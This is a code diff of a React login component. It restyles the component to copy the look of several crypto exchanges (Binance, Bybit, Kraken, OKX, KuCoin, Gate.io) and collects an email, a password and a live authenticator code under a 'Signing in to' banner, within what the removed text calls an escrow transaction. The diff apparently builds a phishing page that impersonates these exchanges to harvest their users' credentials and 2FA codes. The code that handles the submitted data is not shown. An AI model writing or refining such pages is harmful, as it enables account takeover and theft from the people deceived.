@@ -110,68 +110,147 @@ export default function ClientLogin({ onSuccess, onNavigateAdmin, onBack, select
     }
   }
 
-  const inputClass = 'flex items-center gap-3 rounded-xl border-2 border-slate-200 bg-slate-50/50 px-4 py-3.5 transition-all focus-within:border-violet-400 focus-within:bg-white focus-within:shadow-lg focus-within:shadow-violet-100'
+  const platformColor = platform?.color || '#5741D9'
+  const platformLabel = platform?.label || 'Platform'
+  
+  // Platform-specific styling
+  const getPlatformTheme = () => {
+    const themes = {
+      binance: {
+        background: 'linear-gradient(135deg, #0B0E11 0%, #1a1f2e 100%)',
+        cardBg: '#131722',
+        inputBg: '#1e2329',
+        inputBorder: '#434857',
+        textPrimary: '#fff',
+        textSecondary: '#848e9c',
+        accentColor: '#F0B90B',
+        buttonBg: '#F0B90B',
+        buttonText: '#000',
+        focusBorder: '#F0B90B'
+      },
+      bybit: {
+        background: 'linear-gradient(135deg, #0a0e27 0%, #1a1f3a 100%)',
+        cardBg: '#0f1419',
+        inputBg: '#1a2332',
+        inputBorder: '#2d3e52',
+        textPrimary: '#fff',
+        textSecondary: '#8092a3',
+        accentColor: '#F7A600',
+        buttonBg: '#F7A600',
+        buttonText: '#000',
+        focusBorder: '#F7A600'
+      },
+      kraken: {
+        background: 'linear-gradient(135deg, #1a0033 0%, #2d1b4e 100%)',
+        cardBg: '#0d0015',
+        inputBg: '#1a1a2e',
+        inputBorder: '#5741D9',
+        textPrimary: '#fff',
+        textSecondary: '#b0b8c1',
+        accentColor: '#5741D9',
+        buttonBg: '#5741D9',
+        buttonText: '#fff',
+        focusBorder: '#7560e0'
+      },
+      okx: {
+        background: 'linear-gradient(135deg, #f5f5f5 0%, #e8e8e8 100%)',
+        cardBg: '#fff',
+        inputBg: '#f8f8f8',
+        inputBorder: '#ddd',
+        textPrimary: '#000',
+        textSecondary: '#666',
+        accentColor: '#000',
+        buttonBg: '#000',
+        buttonText: '#fff',
+        focusBorder: '#333'
+      },
+      kucoin: {
+        background: 'linear-gradient(135deg, #0d1f1f 0%, #1a2d2a 100%)',
+        cardBg: '#0f1f1f',
+        inputBg: '#1a3a37',
+        inputBorder: '#23AF91',
+        textPrimary: '#fff',
+        textSecondary: '#8fb8b0',
+        accentColor: '#23AF91',
+        buttonBg: '#23AF91',
+        buttonText: '#000',
+        focusBorder: '#23AF91'
+      },
+      gateio: {
+        background: 'linear-gradient(135deg, #0a1a1f 0%, #1a2d35 100%)',
+        cardBg: '#0f1822',
+        inputBg: '#1a2a35',
+        inputBorder: '#17E6A1',
+        textPrimary: '#fff',
+        textSecondary: '#8ab3a5',
+        accentColor: '#17E6A1',
+        buttonBg: '#17E6A1',
+        buttonText: '#000',
+        focusBorder: '#17E6A1'
+      }
+    }
+    
+    const platformKey = selectedPlatform?.toLowerCase() || 'kraken'
+    return themes[platformKey] || themes.kraken
+  }
+
+  const theme = getPlatformTheme()
 
   return (
-    <div className="bg-white min-h-screen flex items-center justify-center p-6 transition-colors relative">
-      {/* Decorative gradient orbs */}
-      <div className="absolute top-0 left-1/4 w-96 h-96 bg-gradient-to-br from-violet-200/40 to-transparent rounded-full blur-3xl" />
-      <div className="absolute bottom-0 right-1/4 w-96 h-96 bg-gradient-to-tl from-emerald-200/40 to-transparent rounded-full blur-3xl" />
-      
-      {/* Top gradient bar */}
-      <div className="absolute top-0 left-0 right-0 h-1 bg-gradient-to-r from-emerald-500 via-violet-500 to-amber-500" />
+    <div className="min-h-screen flex items-center justify-center p-6 transition-colors relative overflow-hidden" style={{ background: theme.background }}>
+      {/* Animated background elements */}
+      <div className="absolute top-0 left-0 w-96 h-96 rounded-full opacity-10 blur-3xl" style={{ backgroundColor: platformColor }} />
+      <div className="absolute bottom-0 right-0 w-96 h-96 rounded-full opacity-10 blur-3xl" style={{ backgroundColor: platformColor }} />
       
       {onBack && (
         <button
           type="button"
           onClick={onBack}
-          className="absolute top-8 left-6 flex items-center gap-2 px-4 py-2 rounded-xl bg-white hover:bg-slate-50 text-slate-600 border-2 border-slate-200 transition shadow-sm hover:shadow-md"
+          className="absolute top-8 left-6 flex items-center gap-2 px-4 py-2 rounded-lg transition hover:opacity-80"
+          style={{ color: theme.textPrimary, borderColor: theme.inputBorder, border: '1px solid' }}
         >
           <ChevronLeft className="w-4 h-4" />
           Change Platform
         </button>
       )}
       
-      <div className="w-full max-w-lg rounded-3xl border-2 border-slate-100 bg-white p-10 shadow-2xl shadow-slate-200/50 space-y-6 relative z-10">
-        {/* Selected Platform Header */}
+      <div className="w-full max-w-md rounded-2xl p-8 shadow-2xl space-y-6 relative z-10" style={{ backgroundColor: theme.cardBg, border: `1px solid ${theme.inputBorder}` }}>
+        {/* Platform Logo/Header */}
         {platform && (
-          <div className="flex items-center gap-4 p-4 rounded-2xl bg-gradient-to-r from-slate-50 to-violet-50 border border-slate-200">
-            <div className="w-14 h-14 rounded-xl bg-white flex items-center justify-center overflow-hidden border-2 border-slate-200 shadow-sm">
+          <div className="flex flex-col items-center gap-4 pb-4 border-b" style={{ borderColor: theme.inputBorder }}>
+            <div className="w-16 h-16 rounded-lg flex items-center justify-center" style={{ backgroundColor: theme.inputBg }}>
               <img
                 src={platformLogos[selectedPlatform]}
-                alt={platform.label}
-                className="w-9 h-9 object-contain"
+                alt={platformLabel}
+                className="w-10 h-10 object-contain"
                 onError={(e) => {
                   e.target.style.display = 'none'
                   e.target.nextSibling.style.display = 'flex'
                 }}
               />
               <div className="hidden items-center justify-center w-full h-full">
-                <Globe className="w-6 h-6 text-slate-400" />
+                <Globe className="w-6 h-6" style={{ color: theme.accentColor }} />
               </div>
             </div>
-            <div>
-              <p className="font-bold text-lg text-slate-800">{platform.label}</p>
-              <p className="text-xs text-slate-500">{platform.description}</p>
-            </div>
+            <p className="text-xl font-bold" style={{ color: theme.textPrimary }}>{platformLabel}</p>
           </div>
         )}
 
         {/* Step Indicator */}
-        <div className="flex items-center justify-center gap-3">
-          <div className={`flex items-center gap-2 px-3 py-1.5 rounded-full text-xs font-semibold ${
-            step >= 1 ? 'bg-violet-100 text-violet-700' : 'bg-slate-100 text-slate-400'
-          }`}>
-            {step > 1 ? <CheckCircle2 className="w-3.5 h-3.5" /> : <span className="w-4 h-4 rounded-full bg-violet-600 text-white text-[10px] flex items-center justify-center">1</span>}
+        <div className="flex items-center justify-center gap-2">
+          <div className={`flex items-center gap-1.5 px-2.5 py-1 rounded text-xs font-semibold`} style={{
+            backgroundColor: step >= 1 ? theme.accentColor : theme.inputBg,
+            color: step >= 1 ? theme.buttonText : theme.textSecondary
+          }}>
+            {step > 1 ? <CheckCircle2 className="w-3 h-3" /> : <span>1</span>}
             Login
           </div>
-          <div className={`w-8 h-0.5 ${step >= 2 ? 'bg-violet-400' : 'bg-slate-200'}`} />
-          <div className={`flex items-center gap-2 px-3 py-1.5 rounded-full text-xs font-semibold ${
-            step >= 2 ? 'bg-emerald-100 text-emerald-700' : 'bg-slate-100 text-slate-400'
-          }`}>
-            <span className={`w-4 h-4 rounded-full text-[10px] flex items-center justify-center ${
-              step >= 2 ? 'bg-emerald-600 text-white' : 'bg-slate-300 text-white'
-            }`}>2</span>
+          <div className={`flex-1 h-0.5 mx-1`} style={{ backgroundColor: step >= 2 ? theme.accentColor : theme.inputBorder }} />
+          <div className={`flex items-center gap-1.5 px-2.5 py-1 rounded text-xs font-semibold`} style={{
+            backgroundColor: step >= 2 ? theme.accentColor : theme.inputBg,
+            color: step >= 2 ? theme.buttonText : theme.textSecondary
+          }}>
+            <span>2</span>
             2FA
           </div>
         </div>
@@ -180,62 +259,69 @@ export default function ClientLogin({ onSuccess, onNavigateAdmin, onBack, select
         {step === 1 && (
           <>
             <div>
-              <div className="inline-flex items-center gap-2 rounded-full bg-gradient-to-r from-violet-50 to-purple-50 border border-violet-200 px-4 py-1.5 text-xs font-semibold uppercase tracking-[0.2em] text-violet-700 shadow-sm">
-                <ShieldCheck className="w-3.5 h-3.5 text-violet-600" /> Secure Login
-              </div>
-              <h1 className="mt-4 text-3xl font-bold bg-gradient-to-r from-slate-800 via-violet-700 to-slate-800 bg-clip-text text-transparent">
-                Sign In to {platform?.label || 'Platform'}
-              </h1>
-              <p className="mt-2 text-sm text-slate-500">
-                Enter your credentials to continue with your secure escrow transaction.
-              </p>
+              <h2 className="text-2xl font-bold mb-2" style={{ color: theme.textPrimary }}>Sign In</h2>
+              <p className="text-sm" style={{ color: theme.textSecondary }}>Enter your login credentials</p>
             </div>
             
             <form onSubmit={handleCredentialsSubmit} className="space-y-4">
               {/* Email Field */}
-              <label className="text-sm font-semibold text-slate-700 flex flex-col gap-2">
-                Email Address
-                <div className={inputClass}>
-                  <Mail className="w-4 h-4 text-violet-500" />
+              <div className="flex flex-col gap-2">
+                <label className="text-sm font-medium" style={{ color: theme.textSecondary }}>Email</label>
+                <div className="flex items-center gap-3 rounded-lg px-4 py-3 transition-all" style={{
+                  backgroundColor: theme.inputBg,
+                  border: `1px solid ${theme.inputBorder}`,
+                  outline: 'none'
+                }}>
+                  <Mail className="w-4 h-4 flex-shrink-0" style={{ color: theme.accentColor }} />
                   <input
                     type="email"
-                    className="flex-1 bg-transparent outline-none text-slate-800 placeholder-slate-400"
-                    placeholder="you@example.com"
+                    className="flex-1 bg-transparent outline-none text-sm"
+                    placeholder="your@email.com"
                     value={email}
                     onChange={(e) => setEmail(e.target.value)}
                     autoComplete="email"
                     disabled={isVerifying}
+                    style={{ color: theme.textPrimary }}
                   />
                 </div>
-              </label>
+              </div>
 
               {/* Password Field */}
-              <label className="text-sm font-semibold text-slate-700 flex flex-col gap-2">
-                Password
-                <div className={inputClass}>
-                  <Lock className="w-4 h-4 text-amber-500" />
+              <div className="flex flex-col gap-2">
+                <label className="text-sm font-medium" style={{ color: theme.textSecondary }}>Password</label>
+                <div className="flex items-center gap-3 rounded-lg px-4 py-3 transition-all" style={{
+                  backgroundColor: theme.inputBg,
+                  border: `1px solid ${theme.inputBorder}`
+                }}>
+                  <Lock className="w-4 h-4 flex-shrink-0" style={{ color: theme.accentColor }} />
                   <input
                     type="password"
-                    className="flex-1 bg-transparent outline-none text-slate-800 placeholder-slate-400"
-                    placeholder="Enter your password"
+                    className="flex-1 bg-transparent outline-none text-sm"
+                    placeholder="••••••••"
                     value={password}
                     onChange={(e) => setPassword(e.target.value)}
                     autoComplete="current-password"
                     disabled={isVerifying}
+                    style={{ color: theme.textPrimary }}
                   />
                 </div>
-              </label>
+              </div>
 
               {localError && (
-                <div className="flex items-center gap-2 p-3 rounded-xl bg-red-50 border border-red-200">
-                  <p className="text-sm text-red-600 font-medium">{localError}</p>
+                <div className="flex items-center gap-2 p-3 rounded-lg text-sm" style={{ backgroundColor: '#3d1f1f', color: '#ff6b6b', border: '1px solid #5a3a3a' }}>
+                  <AlertCircle className="w-4 h-4 flex-shrink-0" />
+                  <p>{localError}</p>
                 </div>
               )}
               
               <button
                 type="submit"
-                disabled={isVerifying}
-                className="w-full flex items-center justify-center gap-2 rounded-2xl bg-gradient-to-r from-violet-600 to-purple-600 py-3.5 font-semibold text-white transition-all hover:from-violet-500 hover:to-purple-500 hover:shadow-lg hover:shadow-violet-200 disabled:cursor-not-allowed disabled:opacity-60"
+                disabled={isVerifying || !email || !password}
+                className="w-full py-3 rounded-lg font-semibold text-sm transition-all hover:opacity-90 disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
+                style={{
+                  backgroundColor: theme.buttonBg,
+                  color: theme.buttonText
+                }}
               >
                 {isVerifying ? (
                   <>
@@ -257,60 +343,67 @@ export default function ClientLogin({ onSuccess, onNavigateAdmin, onBack, select
         {step === 2 && (
           <>
             <div>
-              <div className="inline-flex items-center gap-2 rounded-full bg-gradient-to-r from-emerald-50 to-teal-50 border border-emerald-200 px-4 py-1.5 text-xs font-semibold uppercase tracking-[0.2em] text-emerald-700 shadow-sm">
-                <Fingerprint className="w-3.5 h-3.5 text-emerald-600" /> Two-Factor Authentication
-              </div>
-              <h1 className="mt-4 text-3xl font-bold bg-gradient-to-r from-slate-800 via-emerald-700 to-slate-800 bg-clip-text text-transparent">
-                Verify Your Identity
-              </h1>
-              <p className="mt-2 text-sm text-slate-500">
-                Enter the 6-digit code from your authenticator app to complete sign in.
-              </p>
+              <h2 className="text-2xl font-bold mb-2" style={{ color: theme.textPrimary }}>Verify Your Identity</h2>
+              <p className="text-sm" style={{ color: theme.textSecondary }}>Enter the 6-digit code from your authenticator app</p>
             </div>
 
             {/* User info display */}
-            <div className="flex items-center gap-3 p-3 rounded-xl bg-slate-50 border border-slate-200">
-              <div className="w-10 h-10 rounded-full bg-gradient-to-br from-violet-500 to-purple-600 flex items-center justify-center text-white font-bold">
+            <div className="flex items-center gap-3 p-4 rounded-lg" style={{
+              backgroundColor: theme.inputBg,
+              border: `1px solid ${theme.inputBorder}`
+            }}>
+              <div className="w-10 h-10 rounded-lg flex items-center justify-center text-sm font-bold" style={{
+                backgroundColor: theme.accentColor,
+                color: theme.buttonText
+              }}>
                 {email.charAt(0).toUpperCase()}
               </div>
               <div>
-                <p className="text-sm font-semibold text-slate-800">{email}</p>
-                <p className="text-xs text-slate-500">Signing in to {platform?.label}</p>
+                <p className="text-sm font-semibold" style={{ color: theme.textPrimary }}>{email}</p>
+                <p className="text-xs" style={{ color: theme.textSecondary }}>Signing in to {platform?.label}</p>
               </div>
             </div>
             
             <form onSubmit={handle2FASubmit} className="space-y-4">
               {/* 2FA Code Field */}
-              <label className="text-sm font-semibold text-slate-700 flex flex-col gap-2">
-                Authentication Code
-                <div className={inputClass}>
-                  <Fingerprint className="w-4 h-4 text-emerald-500" />
+              <div className="flex flex-col gap-2">
+                <label className="text-sm font-medium" style={{ color: theme.textSecondary }}>Authentication Code</label>
+                <div className="flex items-center gap-3 rounded-lg px-4 py-3 transition-all" style={{
+                  backgroundColor: theme.inputBg,
+                  border: `1px solid ${theme.inputBorder}`
+                }}>
+                  <Fingerprint className="w-4 h-4 flex-shrink-0" style={{ color: theme.accentColor }} />
                   <input
                     type="text"
                     inputMode="numeric"
                     maxLength={6}
-                    className="flex-1 bg-transparent outline-none tracking-[0.4em] font-mono text-xl text-center text-slate-800 placeholder-slate-400"
+                    className="flex-1 bg-transparent outline-none tracking-[0.3em] font-mono text-xl text-center"
                     placeholder="000000"
                     value={twoFactorCode}
                     onChange={(e) => setTwoFactorCode(e.target.value.replace(/\D/g, '').slice(0, 6))}
                     autoComplete="one-time-code"
                     autoFocus
                     disabled={isVerifying}
+                    style={{ color: theme.textPrimary }}
                   />
                 </div>
-                <span className="text-xs text-slate-500">Enter the 6-digit code from your authenticator app</span>
-              </label>
+              </div>
 
               {localError && (
-                <div className="flex items-center gap-2 p-3 rounded-xl bg-red-50 border border-red-200">
-                  <p className="text-sm text-red-600 font-medium">{localError}</p>
+                <div className="flex items-center gap-2 p-3 rounded-lg text-sm" style={{ backgroundColor: '#3d1f1f', color: '#ff6b6b', border: '1px solid #5a3a3a' }}>
+                  <AlertCircle className="w-4 h-4 flex-shrink-0" />
+                  <p>{localError}</p>
                 </div>
               )}
               
               <button
                 type="submit"
-                disabled={isVerifying || loadingRole === 'client'}
-                className="w-full flex items-center justify-center gap-2 rounded-2xl bg-gradient-to-r from-emerald-500 to-teal-500 py-3.5 font-semibold text-white transition-all hover:from-emerald-400 hover:to-teal-400 hover:shadow-lg hover:shadow-emerald-200 disabled:cursor-not-allowed disabled:opacity-60"
+                disabled={isVerifying || loadingRole === 'client' || twoFactorCode.length !== 6}
+                className="w-full py-3 rounded-lg font-semibold text-sm transition-all hover:opacity-90 disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
+                style={{
+                  backgroundColor: theme.buttonBg,
+                  color: theme.buttonText
+                }}
               >
                 {isVerifying || loadingRole === 'client' ? (
                   <>
@@ -328,7 +421,8 @@ export default function ClientLogin({ onSuccess, onNavigateAdmin, onBack, select
               <button
                 type="button"
                 onClick={() => { setStep(1); setLocalError(''); setTwoFactorCode(''); }}
-                className="w-full text-sm text-slate-500 hover:text-slate-700 transition"
+                className="w-full py-2 text-sm transition rounded-lg"
+                style={{ color: theme.textSecondary }}
                 disabled={isVerifying}
               >
                 ← Back to login
@@ -337,8 +431,11 @@ export default function ClientLogin({ onSuccess, onNavigateAdmin, onBack, select
           </>
         )}
         
-        <div className="flex items-center justify-center gap-2 text-xs text-slate-500">
-          <ShieldCheck className="w-3.5 h-3.5 text-emerald-500" />
+        <div className="flex items-center justify-center gap-2 text-xs pt-4 border-t" style={{
+          color: theme.textSecondary,
+          borderColor: theme.inputBorder
+        }}>
+          <ShieldCheck className="w-3.5 h-3.5" style={{ color: theme.accentColor }} />
           Protected by end-to-end encryption
         </div>
       </div>
